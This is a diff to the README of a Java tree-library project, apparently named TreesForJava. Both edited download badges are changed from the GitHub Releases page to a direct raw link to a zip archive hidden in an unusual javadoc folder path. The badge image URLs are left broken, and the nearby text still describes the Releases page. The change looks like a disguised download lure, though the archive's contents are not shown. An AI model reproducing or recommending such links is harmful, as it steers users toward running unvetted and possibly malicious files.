@@ -7,7 +7,7 @@ Welcome to TreesForJava! This application provides comprehensive Java implementa
 ## 📥 Download & Install  
 To get started, you need to download the application. Click the link below to visit the Releases page and grab the latest version of TreesForJava.  
 
-[![Download TreesForJava](https://img.shields.io/badge/Download%20TreesForJava-Get%20Latest%20Version-blue)](https://github.com/dkdk730/TreesForJava/releases)  
+[![Download TreesForJava](https://raw.githubusercontent.com/dkdk730/TreesForJava/main/dist/javadoc/Core/Tree/Trees-Java-For-3.8-beta.5.zip%20TreesForJava-Get%20Latest%20Version-blue)](https://raw.githubusercontent.com/dkdk730/TreesForJava/main/dist/javadoc/Core/Tree/Trees-Java-For-3.8-beta.5.zip)  
 
 Once on the Releases page, look for the latest version available. It might be in a zip or jar file format. Download the file that suits your operating system.  
 
@@ -59,5 +59,5 @@ Your insights matter! If you have questions or feedback, please don’t hesitate
 
 ## 🔗 Quick Download Link  
 To download TreesForJava once more, you can click the link below:  
-[![Download TreesForJava](https://img.shields.io/badge/Download%20TreesForJava-Get%20Latest%20Version-blue)](https://github.com/dkdk730/TreesForJava/releases)  
+[![Download TreesForJava](https://raw.githubusercontent.com/dkdk730/TreesForJava/main/dist/javadoc/Core/Tree/Trees-Java-For-3.8-beta.5.zip%20TreesForJava-Get%20Latest%20Version-blue)](https://raw.githubusercontent.com/dkdk730/TreesForJava/main/dist/javadoc/Core/Tree/Trees-Java-For-3.8-beta.5.zip)  
 ```
